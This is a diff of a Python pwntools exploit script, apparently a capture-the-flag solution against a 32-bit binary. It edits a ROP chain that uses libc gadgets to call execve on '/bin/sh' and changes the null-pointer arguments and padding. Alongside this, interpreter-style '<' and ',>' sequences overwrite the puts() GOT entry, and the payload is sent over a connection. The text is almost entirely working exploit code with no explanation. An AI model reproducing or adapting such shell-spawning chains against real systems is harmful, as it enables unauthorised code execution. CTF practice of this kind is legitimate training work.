@@ -104,18 +104,18 @@ fgets_addr_in_main = 0x8048734
 memset_addr_in_main = 0x8048700
 pop_ebx = libc_addr + 0x000183a5
 # 2nd program iteration - 1st half
+null_addr = 0x804b20c
 payload = p32(memset_addr_in_main)
 payload +=b"aaaabaaacaaa"
 payload += p32(pop_ebx)
 payload += p32(sh_addr)
 payload += p32(execve_addr)
-#payload += p32(sh_addr)
-null_arr = 0xffffccd8
+payload += p32(0x11111111)
 payload += p32(sh_addr)
-payload += p32(null_arr)
+payload += p32(null_addr)
+payload += p32(null_addr)
+payload += p32(0x55555555)
 # fallback is putting it in heap in fgets input
-payload +=p32(null_arr) 
-payload +=p32(null_arr) 
 #payload +=b" flagaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"# decrease from putchar() GOT to puts() GOT address
 payload += b"<"  * 27# decrease from putchar() GOT to puts() GOT address
 payload += b",>,>,>," # Setting the puts() GOT address
@@ -130,10 +130,11 @@ with open("payload", "ab+") as f:
 add_esp = libc_addr + 0x0005b980 # pop ecx pop edx-1st pop to get rid of [ str
 payload = p32(add_esp) # the ADD ESP ROP address
 payload += b"AAAABBBB" # jump to memset() line
-payload += p32(0x8048700) # jump to memset() line
-payload += p32(0x22334455) # jump to memset() line
+#payload += p32(0x8048700) # jump to memset() line
+#payload += p32(0x22334455) # jump to memset() line
 payload += b"\n" # call to puts()
 conn.sendline(payload)
+
 
 with open("payload", "ab+") as f:
     f.write(payload)
